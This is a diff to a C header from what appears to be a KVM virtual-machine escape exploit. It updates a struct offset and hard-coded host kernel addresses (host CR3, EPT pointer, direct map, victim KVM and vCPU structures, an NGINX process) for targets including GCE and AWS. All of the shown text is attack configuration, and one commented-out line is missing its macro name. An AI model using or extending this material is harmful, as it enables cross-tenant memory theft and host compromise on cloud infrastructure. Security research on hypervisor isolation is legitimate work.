@@ -121,7 +121,7 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 
 // struct kvm_lapic {
 #define H_LAPIC_BASE_ADDR	0x0	// u64 base_address == 0xfee00000
-#define H_LAPIC_VCPU		0x88	// struct kvm_vcpu *vcpu
+#define H_LAPIC_VCPU		0x98	// struct kvm_vcpu *vcpu
 // };
 
 // struct kvm_vcpu {
@@ -243,22 +243,26 @@ typedef unsigned long pte_t; // page table entry - pfn is host physical
 #define HOST_DIRECT_MAP	0xffffa03300000000
 #define OWN_VCPU	0xffffa03509eea300
 #define OWN_TASK	0xffffa0340565afb0
+#define HCR3		0x426d18000
 #define OWN_KVM		0xffffb1b08d9f5000
 #define VICTIM_KVM	0xffffb1b08ef31000
-#define HCR3		0x426d18000
 #define VICTIM_VCPU	0xffffa03509694600
 #define EPTP		0x10209e000
 #define GTEXT		0xffffffffa7c00000
 #define INIT_COMM	0x34f211e68
 #define NGINX		0x1f93dc100
 #elif MACHINE == GCE
-#define BASE 0x88d43f218
-#define OWN_TASK 0xffff936a91dba000
+#define BASE		0x88d43f218
+#define HOST_DIRECT_MAP	0xffff934040000000
+#define OWN_VCPU	0xffff9352eff70e40
+#define OWN_TASK	0xffff936a91dba000
+#define HCR3		0x111cf6000
+#define OWN_KVM		0xffff9584f2d71000
 #elif MACHINE == AWS
-#define BASE            0xa1d35218ULL
-// #define HOST_DIRECT_MAP 0xffff93e3c0000000
-// #define OWN_VCPU        0xffff93e461290000
-// #define OWN_TASK	0xffff93e46128b2a0
+#define BASE		0xa1d35218ULL
+// #define HOST_DIRECT_MAP	0xffff93e3c0000000
+// #define OWN_VCPU	0xffff93e461290000
+// #define 		0xffff93e46128b2a0
 #endif // MACHINE
 
 #elif LEAK == CHEAT || LEAK == CHEAT_NOISY
